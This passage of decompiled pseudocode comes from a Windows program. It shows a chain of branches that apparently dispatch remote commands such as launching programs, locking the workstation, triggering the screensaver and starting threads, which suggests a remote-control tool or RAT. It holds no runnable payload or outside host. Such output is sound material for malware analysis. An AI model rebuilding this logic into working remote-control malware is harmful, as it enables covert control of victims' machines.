fcn.00405a84();\n        var_418h = &fcn.00474f94::var_ch;\n        var_41ch = 0x477d67;\n        fcn.00405a44();\n        var_41ch = 0x47cb7c;\n        var_420h = var_14h;\n        var_424h = 0x47cb7c;\n        var_428h = 0x477d84;\n        fcn.004058e0();\n        var_428h = 0x477d95;\n        fcn.0046a37c();\n    }\n    var_428h = 0x477da2;\n    fcn.00405974();\n    if (uVar11) {\n        var_428h = 0x477da9;\n        fcn.0046a45c();\n    }\n    var_428h = &fcn.00474f94::var_468h;\n    var_42ch = 0x477dc2;\n    fcn.00405a44();\n    var_42ch = 0x477dd2;\n    fcn.00405974();\n    if (uVar11) {\n        var_42ch = 0x477dea;\n        fcn.00405a84();\n        var_42ch = &fcn.00474f94::var_ch;\n        var_430h = 0x477dfb;\n        fcn.00405b28();\n        var_430h = 0x477e0b;\n        fcn.00405a44();\n        var_430h = 0x477e18;\n        fcn.00405b28();\n        var_430h = 0x477e27;\n        fcn.00405a84();\n        var_430h = &fcn.00474f94::var_10h;\n        var_434h = 0x477e38;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_434h = 0x477e48;\n        fcn.00405a44();\n        var_434h = 0x477e55;\n        fcn.00405b28();\n        var_434h = 0x477e64;\n        fcn.00405a84();\n        var_434h = 0x477e6f;\n        fcn.004055c8();\n        var_434h = var_10h;\n        var_438h = 0x477e83;\n        fcn.004821f4(var_10h);\n    }\n    var_438h = 0x477e90;\n    fcn.00405974();\n    if (uVar11) {\n        var_438h = 0x2;\n        var_43ch = 0x477ea4;\n        fcn.0045ea34();\n        var_43ch = var_46ch;\n        var_440h = 0x477eb0;\n        (**(*var_46ch + 0x74))();\n        var_438h = 0x477eb5;\n        fcn.0040711c();\n    }\n    var_438h = 0x477ec2;\n    fcn.00405974();\n    if (uVar11) {\n        var_438h = 0xa;\n        var_43ch = 0x477ed6;\n        fcn.0045ea34();\n        var_43ch = var_470h;\n        var_440h = 0x477ee2;\n        (**(*var_470h + 0x74))();\n        var_438h = 0x477ee7;\n        fcn.0040711c();\n    }\n    var_438h = 0x477ef4;\n    fcn.00405974();\n    if (uVar11) {\n        var_438h = 0x22;\n        var_43ch = 0x477f08;\n        fcn.0045ea34();\n        var_43ch = var_474h;\n        var_440h = 0x477f14;\n        (**(*var_474h + 0x74))();\n        var_438h = 0x477f19;\n        fcn.0040711c();\n    }\n    var_438h = 0x477f26;\n    fcn.00405974();\n    if (uVar11) {\n        var_438h = 0x1;\n        var_43ch = 0x477f3a;\n        fcn.0045ea34();\n        var_43ch = var_478h;\n        var_440h = 0x477f46;\n        (**(*var_478h + 0x74))();\n        var_438h = 0x477f4b;\n        fcn.0040711c();\n    }\n    var_438h = 0x477f58;\n    fcn.00405974();\n    if (uVar11) {\n        var_438h = 0x477f6a;\n        fcn.0045ea34();\n        var_438h = var_47ch;\n        var_43ch = 0x477f76;\n        (**(*var_47ch + 0x3c))();\n        var_438h = 0x477f7b;\n        fcn.0040711c();\n    }\n    var_438h = 0x477f88;\n    fcn.00405974();\n    if (uVar11) {\n        var_438h = 0x477f99;\n        var_438h = fcn.00405d28();\n        var_43ch = 0x477faa;\n        fcn.0045ea34();\n        var_43ch = var_484h;\n        var_440h = 0x477fb9;\n        (**(*var_484h + 0x90))();\n        var_440h = 0x477fbe;\n        fcn.0040711c();\n        var_440h = 0x477fcc;\n        fcn.004057d4();\n        var_440h = 0x477fd7;\n        var_440h = fcn.00405d28();\n        var_444h = 0x477fe8;\n        fcn.0045ea34();\n        var_444h = var_48ch;\n        var_448h = 0x477ff4;\n        (**(*var_48ch + 0x24))();\n        var_448h = 0x477ff9;\n        fcn.0040711c();\n        var_448h = 0x478007;\n        fcn.004057d4();\n        var_448h = 0x47800c;\n        cVar1 = fcn.0046a544();\n        if (cVar1 == '\\x01') {\n            var_448h = 0x47801b;\n            var_448h = fcn.00405d28();\n            var_44ch = 0x47802c;\n            fcn.0045ea34();\n            var_44ch = var_494h;\n            var_450h = 0x478038;\n            (**(*var_494h + 0x6c))();\n            var_448h = 0x47803d;\n            fcn.0040711c();\n            var_448h = 0x47804b;\n            fcn.004057d4();\n        }\n        var_448h = 0x478050;\n        cVar1 = fcn.0046a544();\n        if (cVar1 == '\\x01') {\n            var_448h = 0x47805f;\n            var_448h = fcn.00405d28();\n            var_44ch = 0x478070;\n            fcn.0045ea34();\n            var_44ch = var_49ch;\n            var_450h = 0x47807c;\n            (**(*var_49ch + 0x70))();\n            var_448h = 0x478081;\n            fcn.0040711c();\n            var_448h = 0x47808f;\n            fcn.004057d4();\n        }\n        var_448h = 0x47809a;\n        var_448h = fcn.00405d28();\n        var_44ch = 0x4780ab;\n        fcn.0045ea34();\n        var_44ch = var_4a4h;\n        var_450h = 0x4780ba;\n        (**(*var_4a4h + 0x80))();\n        var_408h = 0x4780bf;\n        fcn.0040711c();\n        var_408h = 0x4780cd;\n        fcn.004057d4();\n        if (var_ch == NULL) {\n            var_408h = 0x4780e0;\n            fcn.004055c8();\n        }\n        if (var_10h == NULL) {\n            var_408h = 0x4780f3;\n            fcn.004055c8();\n        }\n        if (var_14h == 0) {\n            var_408h = 0x478106;\n            fcn.004055c8();\n        }\n        if (var_18h == NULL) {\n            var_408h = 0x478119;\n            fcn.004055c8();\n        }\n        uVar11 = var_1ch == NULL;\n        if (uVar11) {\n            var_408h = 0x47812c;\n            fcn.004055c8();\n        }\n        var_408h = 0x47cc3c;\n        var_40ch = var_ch;\n        var_410h = 0x47c330;\n        var_414h = var_10h;\n        var_418h = 0x47c330;\n        var_41ch = var_14h;\n        var_420h = 0x47c330;\n        var_424h = var_18h;\n        var_428h = 0x47c330;\n        var_42ch = var_1ch;\n        var_430h = 0x47c330;\n        var_434h = 0x478164;\n        fcn.0046a5e4();\n        var_434h = var_4ach;\n        var_438h = 0x47817a;\n        fcn.004058e0();\n        var_438h = 0x478185;\n        fcn.00474d1c();\n    }\n    var_438h = &fcn.00474f94::var_4b0h;\n    var_43ch = 0x47819e;\n    fcn.00405a44();\n    var_43ch = 0x4781ae;\n    fcn.00405974();\n    if (uVar11) {\n        var_43ch = 0x4781c6;\n        fcn.00405a84();\n        var_43ch = &fcn.00474f94::var_ch;\n        var_440h = 0x4781d7;\n        fcn.00405b28();\n        var_440h = 0x4781e7;\n        fcn.00405a44();\n        var_440h = 0x4781f4;\n        fcn.00405b28();\n        var_440h = 0x478203;\n        fcn.00405a84();\n        var_440h = &fcn.00474f94::var_10h;\n        var_444h = 0x478214;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_444h = 0x478224;\n        fcn.00405a44();\n        var_444h = 0x478231;\n        fcn.00405b28();\n        var_444h = 0x478240;\n        fcn.00405a84();\n        var_444h = 0x47824b;\n        fcn.004055c8();\n        var_448h = 0x478257;\n        var_444h = &stack0xfffffffc;\n        fcn.0046a868();\n        var_448h = 0x478268;\n        fcn.00474ec8(var_444h);\n    }\n    var_444h = &fcn.00474f94::var_4b8h;\n    var_448h = 0x478282;\n    fcn.00405a44();\n    var_448h = 0x478292;\n    fcn.00405974();\n    if (uVar11) {\n        var_448h = 0x4782a6;\n        fcn.00405a84();\n        var_448h = 0x4782ab;\n        cVar1 = fcn.0046a544();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_448h = 0x4782b7;\n            fcn.0046abf0();\n        }\n    }\n    var_448h = &fcn.00474f94::var_4bch;\n    var_44ch = 0x4782d0;\n    fcn.00405a44();\n    var_44ch = 0x4782e0;\n    fcn.00405974();\n    if (uVar11) {\n        var_44ch = 0x4782f4;\n        fcn.00405a84();\n        var_44ch = 0x4782f9;\n        cVar1 = fcn.0046a544();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_44ch = 0x478305;\n            fcn.0046a7e8();\n        }\n    }\n    var_44ch = &fcn.00474f94::var_4c0h;\n    var_450h = 0x47831e;\n    fcn.00405a44();\n    var_450h = 0x47832e;\n    fcn.00405974();\n    if (uVar11) {\n        var_450h = 0x478342;\n        fcn.00405a84();\n        var_450h = 0x478347;\n        cVar1 = fcn.0046a544();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_450h = 0x478353;\n            fcn.0046ad3c();\n        }\n    }\n    var_450h = &fcn.00474f94::var_4c4h;\n    var_454h = 0x47836c;\n    fcn.00405a44();\n    var_454h = 0x47837c;\n    fcn.00405974();\n    if (uVar11) {\n        var_454h = 0x478390;\n        fcn.00405a84();\n        var_454h = 0x478395;\n        cVar1 = fcn.0046a544();\n        uVar11 = cVar1 == '\\x01';\n        if (uVar11) {\n            var_454h = 0x4783a1;\n            fcn.0046ae88();\n        }\n    }\n    var_454h = &fcn.00474f94::var_4c8h;\n    var_458h = 0x4783ba;\n    fcn.00405a44();\n    var_458h = 0x4783ca;\n    fcn.00405974();\n    if (uVar11) {\n        var_458h = 0x4783de;\n        fcn.00405a84();\n        **0x49253c = 1;\n        var_458h = *0x492624;\n        var_45ch = 0x4783fc;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_45ch = 0x47840c;\n        fcn.00405a44();\n        var_45ch = 0x478419;\n        fcn.00405b28();\n        var_45ch = 0x478428;\n        fcn.00405a84();\n        var_45ch = 0x478435;\n        fcn.00405584();\n    }\n    var_45ch = 0x478442;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x49253c = 0;\n    }\n    var_45ch = &fcn.00474f94::var_4cch;\n    var_460h = 0x478466;\n    fcn.00405a44();\n    var_460h = 0x478476;\n    fcn.00405974();\n    if (uVar11) {\n        var_460h = 0x47848e;\n        fcn.00405a84();\n        if (**0x4923ac == 1) {\n            var_460h = 0x4784a2;\n            fcn.00474d1c();\n        }\n        var_460h = &fcn.00474f94::var_ch;\n        var_464h = 0x4784b3;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_464h = 0x4784c3;\n        fcn.00405a44();\n        var_464h = 0x4784d0;\n        fcn.00405b28();\n        var_464h = 0x4784df;\n        fcn.00405a84();\n        var_464h = 0x4784ea;\n        fcn.004055c8();\n        var_468h = 0x4784fb;\n        var_464h = &stack0xfffffffc;\n        fcn.00489414();\n        var_468h = 0x47850b;\n        fcn.00405818();\n        var_468h = 0x47851c;\n        fcn.0047ff14();\n        var_468h = 0x47852d;\n        fcn.00474ec8(var_464h);\n    }\n    var_464h = 0x47853b;\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x4923ac == 1,  !uVar11)) {\n        var_464h = &fcn.00474f94::var_4h;\n        var_468h = NULL;\n        var_46ch = NULL;\n        var_470h = 0x4810a8;\n        var_474h = NULL;\n        var_478h = NULL;\n        var_47ch = 0x47855d;\n        sub.kernel32.dll_CreateThread_1();\n        **0x4923ac = 1;\n    }\n    var_464h = 0x478575;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x4923ac = 0;\n    }\n    var_464h = 0x47858d;\n    fcn.00405974();\n    if (uVar11) {\n        **0x49253c = 1;\n    }\n    var_464h = 0x4785a7;\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        **0x49253c = 0;\n    }\n    var_464h = &fcn.00474f94::var_4d8h;\n    var_468h = 0x4785cb;\n    fcn.00405a44();\n    var_468h = 0x4785db;\n    fcn.00405974();\n    if (uVar11) {\n        var_468h = 0x4785f3;\n        fcn.00405a84();\n        var_468h = &fcn.00474f94::var_ch;\n        var_46ch = 0x478604;\n        fcn.00405b28();\n        var_46ch = 0x478614;\n        fcn.00405a44();\n        var_46ch = 0x478621;\n        fcn.00405b28();\n        var_46ch = 0x478630;\n        fcn.00405a84();\n        var_46ch = &fcn.00474f94::var_10h;\n        var_470h = 0x478641;\n        fcn.00405b28();\n        var_470h = 0x478651;\n        fcn.00405a44();\n        var_470h = 0x47865e;\n        fcn.00405b28();\n        var_470h = 0x47866d;\n        fcn.00405a84();\n        var_470h = 0x478678;\n        fcn.004055c8();\n        var_470h = 0x478688;\n        fcn.00489414();\n        var_470h = var_4e0h;\n        var_474h = 0x47cd24;\n        var_478h = var_ch;\n        var_47ch = 0x4786a6;\n        fcn.004058e0();\n        var_47ch = 0x4786b1;\n        cVar1 = fcn.0040a25c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = var_478h;\n            goto code_r0x0047c19b;\n        }\n        var_480h = 0x4786d3;\n        var_47ch = &stack0xfffffffc;\n        fcn.00489414();\n        var_480h = var_4ech;\n        var_484h = 0x47cd24;\n        var_488h = var_ch;\n        var_48ch = 0x4786f1;\n        fcn.004058e0();\n        var_48ch = 0x478702;\n        fcn.004890f8();\n        var_48ch = 0x478713;\n        fcn.00474ec8(var_488h);\n    }\n    var_488h = 0x478721;\n    fcn.00405974();\n    if (uVar11) {\n        var_488h = 0x47872d;\n        fcn.004886b8();\n    }\n    var_488h = 0x47873a;\n    fcn.00405974();\n    if (uVar11) {\n        var_488h = 0x478746;\n        fcn.004886b8();\n    }\n    var_488h = 0x478753;\n    fcn.00405974();\n    if (uVar11) {\n        var_488h = 0x47875f;\n        fcn.004886b8();\n    }\n    var_488h = 0x47876c;\n    fcn.00405974();\n    if (uVar11) {\n        var_488h = 0x478778;\n        fcn.004886b8();\n    }\n    var_488h = 0x478785;\n    fcn.00405974();\n    if (uVar11) {\n        var_488h = NULL;\n        var_48ch = 0xf140;\n        var_490h = 0x112;\n        var_494h = NULL;\n        var_498h = 0x47879a;\n        sub.user32.dll_SendMessageA();\n    }\n    var_488h = 0x4787a7;\n    fcn.00405974();\n    if (uVar11) {\n        var_488h = 0x4787ae;\n        sub.user32.dll_LockWorkStation();\n    }\n    var_488h = &fcn.00474f94::var_4f0h;\n    var_48ch = 0x4787c7;\n    fcn.00405a44();\n    var_48ch = 0x4787d7;\n    fcn.00405974();\n    if (uVar11) {\n        var_48ch = 0x4787ef;\n        fcn.00405a84();\n        var_48ch = &fcn.00474f94::var_10h;\n        var_490h = 0x478800;\n        fcn.00405b28();\n        var_490h = 0x478810;\n        fcn.00405a44();\n        var_490h = 0x47881d;\n        fcn.00405b28();\n        var_490h = 0x47882c;\n        fcn.00405a84();\n        var_490h = &fcn.00474f94::var_14h;\n        var_494h = 0x47883d;\n        fcn.00405b28();\n        var_494h = 0x47884d;\n        fcn.00405a44();\n        var_494h = 0x47885a;\n        fcn.00405b28();\n        var_494h = 0x478869;\n        fcn.00405a84();\n        var_494h = 0x478874;\n        fcn.004055c8();\n        var_494h = 0x478887;\n        fcn.00405728();\n        var_494h = var_4f4h;\n        var_498h = 0x47c750;\n        var_49ch = 0x4788a5;\n        fcn.00409d60();\n        var_49ch = var_4f8h;\n        var_4a0h = 0x47c750;\n        var_4a4h = 0x4788bb;\n        fcn.0048bcec();\n        var_4a4h = var_4fch;\n        var_4a8h = 0x47c750;\n        var_4ach = 0x4788d1;\n        fcn.0048b4f8();\n        var_4ach = var_500h;\n        var_4b0h = 0x47c60c;\n        var_4b4h = 0x4788e7;\n        fcn.0048b4bc();\n        var_4b4h = var_504h;\n        var_4b8h = 0x47c750;\n        var_4bch = 0x4788fd;\n        fcn.0048ba0c();\n        var_4bch = var_508h;\n        var_4c0h = 0x47c750;\n        var_4c4h = 0x478913;\n        fcn.00467758();\n        var_4c4h = var_50ch;\n        var_4c8h = 0x47c750;\n        var_4cch = 0x47ce60;\n        var_4d0h = 0x47c750;\n        var_4d4h = 0x478933;\n        fcn.0048b580();\n        var_4d4h = var_510h;\n        var_4d8h = 0x47c750;\n        var_4dch = 0x478949;\n        fcn.0048b83c();\n        var_4dch = var_514h;\n        var_4e0h = 0x47c750;\n        var_4e4h = 0x47895f;\n        fcn.0048b890();\n        var_4e4h = var_518h;\n        var_4e8h = 0x47c750;\n        var_4ech = 0x478975;\n        fcn.0048b8e0();\n        var_4ech = var_51ch;\n        var_4f0h = 0x47c750;\n        var_4f4h = 0x47898b;\n        fcn.0048b944();\n        var_4f4h = var_520h;\n        var_4f8h = 0x47c750;\n        var_4fch = 0x4789a1;\n        fcn.0048bd1c();\n        var_4fch = var_524h;\n        var_500h = 0x47c750;\n        var_504h = 0x4789b7;\n        fcn.0048bd4c();\n        var_504h = var_528h;\n        var_508h = 0x47c750;\n        var_50ch = 0x4789cd;\n        fcn.0048bff8();\n        var_50ch = var_52ch;\n        var_510h = 0x47c750;\n        var_514h = 0x4789e3;\n        fcn.00467e4c();\n        var_514h = 0x4789f4;\n        fcn.0048c090();\n        var_514h = var_530h;\n        var_518h = 0x47c750;\n        uVar11 = 1;\n        var_51ch = 0x478a0c;\n        fcn.0040f224();\n        var_51ch = var_538h;\n        var_520h = 0x47c750;\n        var_524h = **0x4927f0;\n        var_528h = 0x47c750;\n        var_52ch = **0x4923c8;\n        var_530h = 0x47c750;\n        var_534h = 0x478a3f;\n        fcn.0046d960();\n        var_534h = 0x478a50;\n        fcn.0048a224();\n        var_534h = var_53ch;\n        var_538h = 0x47c750;\n        var_53ch = 0x478a66;\n        fcn.0048a2b4();\n        var_53ch = var_544h;\n        var_540h = 0x47c750;\n        var_544h = 0x478a7c;\n        fcn.0048b20c();\n        var_544h = var_548h;\n        var_548h = 0x478a8f;\n        fcn.004058e0();\n        var_54ch = 0x478a9e;\n        var_548h = &stack0xfffffffc;\n        fcn.00474ec8(&stack0xfffffffc);\n    }\n    var_548h = &fcn.00474f94::var_54ch;\n    var_54ch = 0x478ab8;\n    fcn.00405a44();\n    var_54ch = 0x478ac8;\n    fcn.00405974();\n    if (uVar11) {\n        var_54ch = 0x478ae0;\n        fcn.00405a84();\n        var_54ch = 0x478aeb;\n        fcn.004055c8();\n        uVar11 = **0x4923b8 == 0;\n        if (!uVar11) {\n            var_54ch = 0x478b01;\n            cVar1 = fcn.004845fc();\n            uVar11 = cVar1 == '\\0';\n            if (!uVar11) {\n                *in_FS_OFFSET = var_548h;\n                goto code_r0x0047c19b;\n            }\n        }\n        var_54ch = 0x478b20;\n        iVar9 = fcn.0041f9b4();\n        **0x4923b8 = iVar9;\n        *(**0x4923b8 + 0xf) = 1;\n        var_54ch = 0x478b41;\n        fcn.0041fbc0();\n        var_54ch = 0x478b49;\n        fcn.00409ecc();\n        var_54ch = 0x478b57;\n        fcn.004845ac();\n        var_54ch = 0x478b68;\n        fcn.004845b0();\n        var_54ch = 0x478b74;\n        fcn.0041fe70();\n    }\n    var_54ch = &fcn.00474f94::var_550h;\n    var_550h = 0x478b8d;\n    fcn.00405a44();\n    var_550h = 0x478b9d;\n    fcn.00405974();\n    if (uVar11) {\n        var_550h = 0x478bb1;\n        fcn.00405a84();\n        var_550h = 0x5;\n        var_554h = 0;\n        var_558h = 0;\n        var_55ch = 0x478bbf;\n        var_55ch = fcn.004059dc();\n        var_560h = 0x47c418;\n        var_564h = 0;\n        var_568h = 0x478bcc;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    var_568h = &fcn.00474f94::var_554h;\n    var_56ch = 0x478be5;\n    fcn.00405a44();\n    var_56ch = 0x478bf5;\n    fcn.00405974();\n    if (uVar11) {\n        var_56ch = 0x478c0d;\n        fcn.00405a84();\n        var_56ch = 0x478c19;\n        var_1a8h = fcn.00404620();\n        var_56ch = 0x478c2d;\n        (**(*var_1a8h + 0x2c))();\n        var_570h = 0x478daa;\n        var_574h = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00474f94::var_574h;\n        var_578h = 0x478c46;\n        var_56ch = &stack0xfffffffc;\n        iVar9 = (**(*var_1a8h + 0x14))();\n        if (-1 < iVar9 + -1) {\n            do {\n                var_578h = 0x478c64;\n                (**(*var_1a8h + 0xc))();\n                var_548h = &fcn.00474f94::var_ch;\n                var_54ch = 0x478c75;\n                fcn.00405b28();\n                var_54ch = 0x478c85;\n                fcn.00405a44();\n                var_54ch = 0x478c92;\n                fcn.00405b28();\n                var_54ch = 0x478ca1;\n                fcn.00405a84();\n                var_54ch = &fcn.00474f94::var_10h;\n                var_550h = 0x478cb2;\n                fcn.00405b28();\n                var_550h = 0x478cc2;\n                fcn.00405a44();\n                var_550h = 0x478ccf;\n                fcn.00405b28();\n                var_550h = 0x478cde;\n                fcn.00405a84();\n                var_550h = &fcn.00474f94::var_14h;\n                var_554h = 0x478cef;\n                fcn.00405b28();\n                var_554h = 0x478cff;\n                fcn.00405a44();\n                var_554h = 0x478d0c;\n                fcn.00405b28();\n                var_554h = 0x478d1b;\n                fcn.00405a84();\n                var_554h = 0x478d26;\n                fcn.004055c8();\n                var_554h = 0x10;\n                var_558h = 0x40;\n                var_55ch = 0x478d2f;\n                var_1a4h = sub.kernel32.dll_LocalAlloc_1();\n                var_55ch = 0x478d47;\n                fcn.00405584();\n                var_55ch = 0x478d52;\n                fcn.00405584();\n                var_55ch = 0x478d5d;\n                fcn.00405584();\n                var_55ch = 0x478d68;\n                fcn.00405584();\n                var_55ch = &fcn.00474f94::var_4h;\n                var_560h = 0;\n                var_564h = var_1a4h;\n                var_568h = fcn.00474b58;\n                var_56ch = NULL;\n                var_570h = NULL;\n                var_574h = 0x478d83;\n                var_574h = sub.kernel32.dll_CreateThread_1();\n                var_578h = 0x478d89;\n                sub.kernel32.dll_CloseHandle_1();\n                iVar9 = iVar9 + -1;\n            } while (iVar9 != 0);\n        }\n        *in_FS_OFFSET = var_574h;\n        var_56ch = 0x478db1;\n        var_570h = 0x478da9;\n        fcn.00404650();\n        return;\n    }\n    var_56ch = &fcn.00474f94::var_558h;\n    var_570h = 0x478dca;\n    fcn.00405a44();\n    var_570h = 0x478dda;\n    fcn.00405974();\n    if (uVar11) {\n        var_570h = 0x478df2;\n        fcn.00405a84();\n        var_570h = &fcn.00474f94::var_ch;\n        var_574h = 0x478e03;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_574h = 0x478e13;\n        fcn.00405a44();\n        var_574h = 0x478e20;\n        fcn.00405b28();\n        var_574h = 0x478e2f;\n        fcn.00405a84();\n        var_574h = 0x478e3a;\n        fcn.004055c8();\n        var_574h = 0x10;\n        var_578h = 0x40;\n        var_57ch = 0x478e43;\n        var_1a4h = sub.kernel32.dll_LocalAlloc_1();\n        var_57ch = 0x478e5b;\n        fcn.00405584();\n        var_57ch = 0x478e66;\n        fcn.00405584();\n        var_57ch = 0x478e73;\n        fcn.00405584();\n        var_57ch = 0x478e80;\n        fcn.00405584();\n        var_57ch = &fcn.00474f94::var_4h;\n        var_580h = 0;\n        var_584h = var_1a4h;\n        var_588h = fcn.00474b58;\n        var_58ch = 0;\n        var_590h = 0;\n        var_594h = 0x478e9b;\n        var_594h = sub.kernel32.dll_CreateThread_1();\n        var_598h = 0x478ea1;\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    var_598h = &fcn.00474f94::var_55ch;\n    var_59ch = 0x478eba;\n    fcn.00405a44();\n    var_59ch = 0x478eca;\n    fcn.00405974();\n    if (uVar11) {\n        var_59ch = 0x478ede;\n        fcn.00405a84();\n        var_59ch = 0x478ee9;\n        fcn.004881f8();\n        var_59ch = 0x478ef9;\n        fcn.00405818();\n        var_59ch = 0x478f07;\n        fcn.004891a0();\n        var_59ch = 0;\n        var_5a0h = 0;\n        var_5a4h = 0;\n        var_5a8h = 0x478f18;\n        fcn.004881f8();\n        var_5a8h = 0x478f28;\n        fcn.00405818();\n        var_5a8h = 0x478f33;\n        var_5a8h = fcn.004059dc();\n        var_5ach = 0x47cf04;\n        uStack1460 = 0;\n        puStack1464 = 0x478f40;\n        sub.shell32.dll_ShellExecuteA();\n    }\n    puStack1464 = 0x478f4d;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1464 = 0x478f5e;\n        fcn.0046afd4();\n        if (var_568h != NULL) {\n            puStack1464 = 0x478f72;\n            fcn.0046afd4();\n            puStack1464 = 0x478f88;\n            fcn.00405864();\n            puStack1464 = 0x478f93;\n            fcn.00474d1c();\n        }\n        puStack1464 = 0x478f9e;\n        fcn.0046b000();\n        uVar11 = var_574h == NULL;\n        if (!uVar11) {\n            puStack1464 = 0x478fb2;\n            fcn.0046b000();\n            puStack1464 = 0x478fc8;\n            fcn.00405864();\n            puStack1464 = 0x478fd3;\n            fcn.00474d1c();\n        }\n    }\n    puStack1464 = 0x478fe0;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1464 = 0x478fed;\n        fcn.0046afd4();\n        puStack1464 = 0x479003;\n        fcn.00405864();\n        puStack1464 = 0x47900e;\n        fcn.00474d1c();\n    }\n    puStack1464 = &fcn.00474f94::var_588h;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0040ef34(&fcn.00474f94::var_58ch, *0x47c334);\n        fcn.004055c8();\n        fcn.004319ec();\n        fcn.00431574();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        piVar7 = fcn.004319ec();\n        (**(*piVar7 + 0x10))();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puStack1484 = &fcn.00474f94::var_10h;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.0046b198();\n        fcn.00474ec8(arg_8h_02);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        sub.ole32.dll_CoInitialize();\n        piVar7 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffa24;\n        puStack1504 = 0x4791b7;\n        fcn.00464ef4();\n        puStack1504 = 0x4791c8;\n        fcn.00409b6c();\n        if (var_598h != NULL) {\n            puStack1504 = 0x4791dc;\n            fcn.00464ef4();\n            puStack1504 = 0x4791f2;\n            fcn.00405864();\n            puStack1504 = 0x4791fd;\n            fcn.00474d1c();\n        }\n        *in_FS_OFFSET = piVar7;\n        sub.ole32.dll_CoUninitialize();\n        return;\n    }\n    fcn.00405a44();\n    puStack1492 = 0x479240;\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        puStack1492 = &fcn.00474f94::var_ch;\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puStack1504 = 0x4792e9;\n        fcn.0048925c();\n        puStack1504 = 0x4792fa;\n        fcn.00474ec8(arg_8h_01);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00468094();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.004680b8();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00467ebc();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00467f20();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00467f84();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00467fc8();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046800c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00468050();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046b50c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046b4e4();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.0046b55c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046b55c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.0046b47c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046b47c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046b340();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        uVar11 = 1;\n        fcn.0046b340();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0046b534();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        puStack1504 = NULL;\n        puStack1508 = NULL;\n        uStack1512 = 0x47d1b4;\n        uStack1516 = 0x47947a;\n        sub.winmm.dll_mciSendStringA();\n    }\n    puStack1504 = 0x479493;\n    fcn.00405a44();\n    puStack1504 = 0x4794a3;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1504 = 0x4794b7;\n        fcn.00405a84();\n        puStack1504 = 0x4794c5;\n        iVar9 = fcn.0041f9b4();\n        *(iVar9 + 0xf) = 1;\n        puStack1504 = 0x4794d4;\n        fcn.0041fbc0();\n        uVar11 = 1;\n        puStack1504 = 0x4794dd;\n        fcn.004845ac();\n        puStack1504 = 0x4794e7;\n        fcn.00484604();\n        puStack1504 = 0x4794f3;\n        fcn.004845b0();\n        puStack1504 = 0x4794fa;\n        fcn.0041fe70();\n    }\n    puStack1504 = &stack0xfffffa48;\n    puStack1508 = 0x479513;\n    fcn.00405a44();\n    puStack1508 = 0x479523;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1508 = 0x479537;\n        fcn.00405a84();\n        puStack1508 = 0x479544;\n        fcn.00405974();\n        if (uVar11) {\n            puStack1508 = 0x47954d;\n            fcn.004748f8();\n        }\n        else {\n            uVar11 = 1;\n            puStack1508 = 0x479556;\n            fcn.004748f8();\n        }\n    }\n    puStack1508 = &stack0xfffffa44;\n    uStack1512 = 0x47956f;\n    fcn.00405a44();\n    uStack1512 = 0x47957f;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1512 = 0x479597;\n        fcn.00405a84();\n        uStack1512 = 0x4795a4;\n        fcn.00487fc4();\n        uStack1512 = 0;\n        uStack1516 = 0;\n        uStack1520 = 0x47d20c;\n        uStack1524 = 0x4795b5;\n        uStack1524 = fcn.004059dc();\n        uStack1528 = 0;\n        puStack1532 = 0x4795bd;\n        